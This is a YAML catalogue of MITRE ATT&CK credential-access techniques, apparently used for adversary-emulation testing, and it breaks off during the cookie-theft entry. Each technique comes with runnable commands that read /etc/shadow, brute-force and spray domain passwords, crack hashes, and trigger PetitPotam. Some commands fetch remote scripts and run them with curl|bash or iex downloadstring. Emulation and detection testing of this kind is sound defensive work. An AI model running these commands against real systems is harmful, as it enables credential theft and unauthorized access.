    Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.[1](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)

    Linux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A "user" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts.[1](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)

    Adversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command.[2](https://arcticwolf.com/resources/blog/arctic-wolf-observes-threat-campaign-targeting-palo-alto-networks-firewall-devices/) Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>[3](https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/). Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.
  tactic: credential-access
  platforms:
    - linux
  executors:
    - name: Access /etc/shadow (Local)
      type: bash
      platform: linux
      command: |-
        sudo cat /etc/shadow > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Access /etc/master.passwd (Local)
      type: sh
      platform: linux
      command: |-
        sudo cat /etc/master.passwd > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Access /etc/passwd (Local)
      type: sh
      platform: linux
      command: |-
        cat /etc/passwd > /tmp/T1003.008.txt
        cat /tmp/T1003.008.txt
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      is_safe: true
    - name: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat
      type: sh
      platform: linux
      command: |-
        unamestr=$(uname)
        if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Access /etc/{shadow,passwd,master.passwd} with shell builtins
      type: sh
      platform: linux
      command: |-
        testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
        [ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
        testcat /etc/passwd
        testcat /etc/shadow
      cleanup: rm -f /tmp/T1003.008.txt
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/008
  is_safe: true
- id: T1040
  name: Network Sniffing
  description: |-
    Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

    Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

    Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.

    In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1](https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html)[2](https://cloud.google.com/vpc/docs/packet-mirroring)[3](https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4](https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/)[5](https://posts.specterops.io/through-the-looking-glass-part-1-f539ae308512) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4](https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws/)

    On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.[6](https://www.us-cert.gov/ncas/alerts/TA18-106A)[7](https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-embedded-packet-capture/116045-productconfig-epc-00.html)
  tactic: credential-access
  tactics:
    - credential-access
    - discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Packet Capture Linux using tshark or tcpdump
      type: bash
      platform: linux
      command: |-
        tcpdump -c 5 -nnni ens33
        tshark -c 5 -i ens33
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture FreeBSD using tshark or tcpdump
      type: sh
      platform: linux
      command: |-
        tcpdump -c 5 -nnni em0
        tshark -c 5 -i em0
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture macOS using tcpdump or tshark
      type: bash
      platform: macos
      command: "sudo tcpdump -c 5 -nnni en0A    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi;"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture Windows Command Prompt
      type: cmd
      platform: windows
      command: '"c:\Program Files\Wireshark\tshark.exe" -i Ethernet -c 5'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows Internal Packet Capture
      type: cmd
      platform: windows
      command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
      cleanup: |-
        netsh trace stop >nul 2>&1
        TIMEOUT /T 5 >nul 2>&1
        del %temp%\trace.etl >nul 2>&1
        del %temp%\trace.cab >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows Internal pktmon capture
      type: cmd
      platform: windows
      command: |-
        pktmon.exe start --etw  -f %TEMP%\t1040.etl
        TIMEOUT /T 5 >nul 2>&1
        pktmon.exe stop
      cleanup: del %TEMP%\t1040.etl
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows Internal pktmon set filter
      type: cmd
      platform: windows
      command: pktmon.exe filter add -p 445
      cleanup: pktmon filter remove
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Packet Capture macOS using /dev/bpfN with sudo
      type: bash
      platform: macos
      command: sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3
      cleanup: rm -f /tmp/t1040_macos_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
      type: bash
      platform: macos
      command: sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3
      cleanup: rm -f /tmp/t1040_macos_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture FreeBSD using /dev/bpfN with sudo
      type: sh
      platform: linux
      command: sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3
      cleanup: rm -f /tmp/t1040_freebsd_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Filtered Packet Capture FreeBSD using /dev/bpfN with sudo
      type: sh
      platform: linux
      command: sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3
      cleanup: rm -f /tmp/t1040_freebsd_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -a -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo
      type: bash
      platform: linux
      command: sudo /tmp/t1040_linux_pcapdemo -a -f -t 3
      cleanup: rm -f /tmp/t1040_linux_pcapdemo
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: PowerShell Network Sniffing
      type: powershell
      platform: windows
      command: |-
        New-NetEventSession -Name Capture007 -LocalFilePath "$ENV:Temp\sniff.etl"
        Add-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100
        Start-NetEventSession -Name Capture007
        Stop-NetEventSession -Name Capture007
        Remove-NetEventSession -Name Capture007
      cleanup: del $ENV:Temp\sniff.etl
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1040
  is_safe: false
- id: T1110.001
  name: Password Guessing
  description: |-
    Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

    Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. [1](https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf)

    Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:

    * SSH (22/TCP)
    * Telnet (23/TCP)
    * FTP (21/TCP)
    * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
    * LDAP (389/TCP)
    * Kerberos (88/TCP)
    * RDP / Terminal Services (3389/TCP)
    * HTTP/HTTP Management Services (80/TCP & 443/TCP)
    * MSSQL (1433/TCP)
    * Oracle (1521/TCP)
    * MySQL (3306/TCP)
    * VNC (5900/TCP)
    * SNMP (161/UDP and 162/TCP/UDP)

    In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.[2](https://www.us-cert.gov/ncas/alerts/TA18-086A). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.[3](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/emotet-now-spreads-via-wi-fi)

    In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: Brute Force Credentials of single Active Directory domain users via SMB
      type: cmd
      platform: windows
      command: |-
        echo Password1> passwords.txt
        echo 1q2w3e4r>> passwords.txt
        echo Password!>> passwords.txt
        echo Spring2022>> passwords.txt
        echo ChangeMe!>> passwords.txt
        @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%username%" "%p" 1>NUL 2>&1 && @echo [*] %username%:%p && @net use /delete %logonserver%\IPC$ > NUL
      timeout: 120
      is_safe: true
    - name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
      type: powershell
      platform: windows
      command: |-
        if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
          exit 1
        }

        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)

        $passwordList = Get-Content -Path "PathToAtomicsFolder\T1110.001\src\passwords.txt"
        foreach ($password in $passwordList){
          $credz = new-object System.Net.NetworkCredential("$ENV:USERNAME", $password, "$env:UserDnsDomain")
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
          try {
            Write-Host " [-] Attempting ${password} on account $ENV:USERNAME."
            $conn.bind()
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] $ENV:USERNAME:${password} are valid credentials!"
          } catch {
            Write-Host $_.Exception.Message
          }
        }
        Write-Host "End of bruteforce"
      timeout: 120
      is_safe: true
    - name: Password Brute User using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1
      timeout: 120
      is_safe: true
    - name: SUDO Brute Force - Debian
      type: bash
      platform: linux
      command: |-
        useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
        su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: SUDO Brute Force - Redhat
      type: bash
      platform: linux
      command: |-
        useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
        su art
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: SUDO Brute Force - FreeBSD
      type: bash
      platform: linux
      command: |-
        pw adduser art -g wheel -s /bin/sh
        echo "password123" | pw usermod art -h 0
        su art
        cd /tmp
        curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
      cleanup: rmuser -y art
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: ESXi - Brute Force Until Account Lockout
      type: powershell
      platform: windows
      command: |-
        $lockout_threshold = [int]"5"
        for ($var = 1; $var -le $lockout_threshold; $var++) {
          PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh "atomic.local" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
          }
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1110/001
  is_safe: true
- id: T1110.002
  name: Password Cracking
  description: "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.[1](https://www.us-cert.gov/ncas/alerts/TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.[2](https://en.wikipedia.org/wiki/Password_cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access."
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Password Cracking with Hashcat
      type: cmd
      platform: windows
      command: |-
        cd PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe\..
        PathToAtomicsFolder\..\ExternalPayloads\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule PathToAtomicsFolder\T1110.002\src\sam.txt PathToAtomicsFolder\T1110.002\src\password.lst
      cleanup: |-
        del "PathToAtomicsFolder\..\ExternalPayloads\hashcat6.7z" >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\7z1900.exe" >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\7z" /Q /S >nul 2>&1
        del "PathToAtomicsFolder\..\ExternalPayloads\hashcat-unzip" /Q /S >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1110/002
  is_safe: false
- id: T1110.003
  name: Password Spraying
  description: |-
    Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. [1](http://www.blackhillsinfosec.com/?p=4645)

    Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

    * SSH (22/TCP)
    * Telnet (23/TCP)
    * FTP (21/TCP)
    * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
    * LDAP (389/TCP)
    * Kerberos (88/TCP)
    * RDP / Terminal Services (3389/TCP)
    * HTTP/HTTP Management Services (80/TCP & 443/TCP)
    * MSSQL (1433/TCP)
    * Oracle (1521/TCP)
    * MySQL (3306/TCP)
    * VNC (5900/TCP)

    In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.[2](https://www.us-cert.gov/ncas/alerts/TA18-086A)

    In order to avoid detection thresholds, adversaries may deliberately throttle password spraying attempts to avoid triggering security alerting. Additionally, adversaries may leverage LDAP and Kerberos authentication attempts, which are less likely to trigger high-visibility events such as Windows "logon failure" event ID 4625 that is commonly triggered by failed SMB connection attempts.[3](https://www.microsoft.com/en-us/security/blog/2024/10/31/chinese-threat-actor-storm-0940-uses-credentials-from-password-spray-attacks-from-a-covert-network/)
  tactic: credential-access
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Password Spray all Domain Users
      type: cmd
      platform: windows
      command: '@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL'
      timeout: 120
      is_safe: true
    - name: Password Spray (DomainPasswordSpray)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force
      timeout: 120
      is_safe: true
    - name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)
      type: powershell
      platform: windows
      command: |-
        if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {
          Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
          exit 1
        }

        $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

        [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389)

        $DomainUsers | Foreach-Object {
          $user = $_
          $password = 'P@ssw0rd!'

          $credz = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain")
          $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
          try {
            Write-Host " [-] Attempting ${password} on account ${user}."
            $conn.bind()
            # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
            Write-Host " [!] ${user}:${password} are valid credentials!"
          } catch {
            Write-Host $_.Exception.Message
          }
        }
        Write-Host "End of password spraying"
      timeout: 120
      is_safe: true
    - name: WinPwn - DomainPasswordSpray Attacks
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        domainpassspray -consoleoutput -noninteractive -emptypasswords
      timeout: 120
      is_safe: true
    - name: Password Spray Invoke-DomainPasswordSpray Light
      type: powershell
      platform: windows
      command: |-
        function Invoke-dpsLight ($Password, $userlist) {
        $users = Get-Content $userlist
        $Domain = "LDAP://" + ([ADSI]"").distinguishedName
        foreach ($User in $users) {
          $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
          if ($Domain_check.name -ne $null) {
            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
          }
          else { Write-Host ". " -NoNewline}
        }
        Write-Host -ForegroundColor green "Finished"
        }
        Invoke-dpsLight "Spring2020" $env:Temp\usersdpsLight.txt
      timeout: 120
      is_safe: true
    - name: Password Spray using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt" password132
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1110/003
  is_safe: true
- id: T1110.004
  name: Credential Stuffing
  description: |-
    Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

    Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

    Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

    * SSH (22/TCP)
    * Telnet (23/TCP)
    * FTP (21/TCP)
    * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
    * LDAP (389/TCP)
    * Kerberos (88/TCP)
    * RDP / Terminal Services (3389/TCP)
    * HTTP/HTTP Management Services (80/TCP & 443/TCP)
    * MSSQL (1433/TCP)
    * Oracle (1521/TCP)
    * MySQL (3306/TCP)
    * VNC (5900/TCP)

    In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.[1](https://www.us-cert.gov/ncas/alerts/TA18-086A)
  tactic: credential-access
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: SSH Credential Stuffing From Linux
      type: bash
      platform: linux
      command: |-
        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
      is_safe: true
    - name: SSH Credential Stuffing From MacOS
      type: bash
      platform: macos
      command: |-
        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
      is_safe: true
    - name: SSH Credential Stuffing From FreeBSD
      type: sh
      platform: linux
      command: |-
        cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@localhost;done
      timeout: 60
      is_safe: true
    - name: Brute Force:Credential Stuffing using Kerbrute Tool
      type: powershell
      platform: windows
      command: |-
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        .\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1110/004
  is_safe: true
- id: T1187
  name: Forced Authentication
  description: |-
    Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

    The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.[1](https://en.wikipedia.org/wiki/Server_Message_Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

    Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.[2](https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/)[3](https://web.archive.org/web/20100210125749/https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx)

    Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server.[4](https://github.com/hob0/hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials.[5](https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf)

    There are several different ways this can occur.[6](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) Some specifics from in-the-wild use include:

    * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.[7](https://www.us-cert.gov/ncas/alerts/TA17-293A)
    * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.[7](https://www.us-cert.gov/ncas/alerts/TA17-293A)

    Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network.[8](https://www.rapid7.com/blog/post/2021/08/03/petitpotam-novel-attack-chain-can-fully-compromise-windows-domains-running-ad-cs/)[9](https://github.com/topotam/PetitPotam)
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: PetitPotam
      type: powershell
      platform: windows
      command: |-
        & "PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1
        Write-Host "End of PetitPotam attack"
      timeout: 120
      is_safe: true
    - name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
        Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
      timeout: 120
      is_safe: true
    - name: Trigger an authenticated RPC call to a target server with no Sign flag set
      type: powershell
      platform: windows
      command: rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1187
  is_safe: true
- id: T1539
  name: Steal Web Session Cookie
  description: |-
    An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

    Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.[1](https://wunderwuzzi23.github.io/blog/passthecookie.html)

    There are several examples of malware targeting cookies from web browsers on the local system.[2](https://securelist.com/project-tajmahal/90240/)[3](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.[4](https://blog.talosintelligence.com/roblox-scam-overview/)[5](https://krebsonsecurity.com/2023/05/discord-admins-hacked-by-malicious-bookmarks/)

